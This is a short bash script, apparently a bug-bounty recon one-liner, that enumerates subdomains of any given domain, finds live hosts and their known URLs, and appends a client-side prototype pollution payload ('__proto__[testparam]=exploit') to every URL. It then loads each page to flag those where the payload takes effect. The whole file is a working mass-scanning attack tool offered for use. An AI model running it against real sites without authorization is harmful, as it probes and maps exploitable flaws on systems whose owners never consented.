#!/bin/bash

domain=$1
subfinder -d $domain -all -silent | httpx -silent | tee alive.txt | gau | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULN"
